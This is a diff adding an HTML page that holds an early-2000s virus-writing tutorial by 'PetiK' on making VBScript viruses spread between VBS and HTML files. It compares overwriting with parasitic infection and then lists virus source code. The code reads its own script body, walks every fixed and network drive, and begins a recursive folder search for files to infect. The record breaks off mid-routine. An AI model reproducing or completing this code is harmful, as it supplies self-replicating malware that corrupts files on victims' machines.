@@ -1,0 +1,1610 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso8859-1">
+<TITLE>... </TITLE> 
+<SCRIPT language="JavaScript">
+var TlxPgNm='id6';
+</SCRIPT>
+<META http-equiv="GENERATOR" CONTENT="Created with Trellix Web, HTML Exporter 2.6.2685"> 
+<!-- MAP_LOCATION=( 84, 24) -->
+</HEAD>
+<BODY BGCOLOR="#000000" TEXT="#F7F7FF" LINK="#FFCC33" ALINK="#009D27" VLINK="#FFCC33">
+    <TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" WIDTH="100%">
+ <Tr>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+  <Td width="100%"></Td>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+ </Tr>
+ <Tr>
+  <Td ALIGN="LEFT" WIDTH="10" VALIGN="top"><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+  <Td><TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="5" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=== VBS/HTML multi-infection ===</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="5" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=== by PetiK (06/19/2002) ====</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># Introducion: #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>This article present how to travel between VBS and HTML file to infect them.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>There are 4 chapters : &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;I: VBS -&gt; VBS</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; II: VBS -&gt; HTML</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;III: HTML-&gt; HTML</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IV: HTML-&gt; VBS</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>#################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># I: VBS -&gt; VBS #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>#################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>We can frequently see this in the VBS virus. There are two sort of infection:</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>-Overwritting :&nbsp;&nbsp;&nbsp;&nbsp;% To bad, the user sees immediatly the problem</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;% Crash the VBS file</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So this solution is not very good.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>-Parasit :&nbsp;&nbsp;&nbsp;&nbsp;% Start of the file :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* 'mark of the virus *</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;VBS virus&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;Real VBS prog &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;% End of the file :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* 'mark of the virus *</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;Real VBS prog &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;VBS virus &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;*</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**********************</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>So we're going to see the code :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'mark</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>On Error Resume Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set ws = CreateObject(&quot;WScript.Shell&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fl = fso.OpenTextFile(WScript.ScriptFullName, 1)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>virus = fl.ReadAll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Stock the virus code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>fl.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infectfile()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Sub infectfile()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>On Error Resume Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set drv = fso.Drives</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>For Each d In drv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Get the drive</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If d.DriveType = 2 Or d.DriveType = 3 Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>list(d.path&amp;&quot;\&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Sub</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Sub list(doss)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
